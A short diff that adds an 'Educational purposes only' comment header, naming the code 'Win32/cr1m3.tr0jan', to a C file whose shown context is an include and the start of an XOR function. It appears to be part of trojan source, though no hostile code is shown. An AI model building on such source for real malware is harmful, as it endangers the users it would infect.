@@ -1,3 +1,10 @@
+/*
+	Educational purposes only
+	GPL LICENSE:  @Cr1m3 / JennyLab
+	Win32/cr1m3.tr0jan
+*/
+
+
 #include "crypto.h"
 // no found bad thinking no more weed inna programming time
 int __xor(char *data,unsigned short key) {
